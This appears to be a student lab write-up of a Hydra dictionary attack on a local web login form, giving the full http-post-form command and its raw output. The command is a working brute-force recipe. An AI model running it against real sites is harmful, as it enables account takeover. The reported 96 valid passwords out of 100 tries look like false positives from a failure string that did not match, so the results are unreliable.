# Dictionary Hydra Attack

### Command
I used following command to attack the webpage: 
hydra -L user.txt -P password.txt 127.0.0.1 -s 8000 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect".
There is that one part, that made it possible for me to do it and it was: -s 8000.
I was using first 127.0.0.1:8000, but it did not work for me.

### Time
Time was about 10 seconds.

### Output of the Hydra Attack

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-18 13:50:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:10/p:10), ~7 tries per task
[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=incorrect
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: snacks4scooby
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: carrots123
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: iamvengeance
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: darkside42
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: donuts4life
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: breaking4thwall
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: deduction221B
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: iamironman
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: chaos123!
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: mickeyisjealous
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: snacks4scooby
1 of 1 target successfully completed, 96 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-18 13:50:51

